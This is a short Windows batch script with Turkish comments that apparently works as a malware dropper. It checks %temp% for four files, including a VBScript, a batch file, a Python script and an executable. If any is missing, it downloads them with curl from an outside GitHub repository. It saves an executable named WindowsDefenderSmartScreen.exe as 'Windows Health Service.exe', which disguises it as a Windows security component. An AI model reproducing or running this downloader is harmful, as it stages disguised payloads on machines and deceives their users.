@echo off

:: Dosya yollarını tanımlayalım
set "FILE1=%temp%\ddd.vbs"
set "FILE2=%temp%\asd.bat"
set "FILE3=%temp%\Windows Health Service.exe"
set "FILE4=%temp%\by.py"

:: Tüm dosyaların varlığını tek tek kontrol et
if exist "%FILE1%" if exist "%FILE2%" if exist "%FILE3%" if exist "%FILE4%" (
    exit
)

:: Eğer biri eksikse indirme işlemlerini başlat
curl -L "https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/asd.bat" -o "%FILE2%"
curl -L "https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/ddd.vbs" -o "%FILE1%"
curl -L "https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/by.py" -o "%FILE4%"
curl -L "https://github.com/seition2doc/dosta2/raw/refs/heads/main/WindowsDefenderSmartScreen.exe" -o "%FILE3%"

exit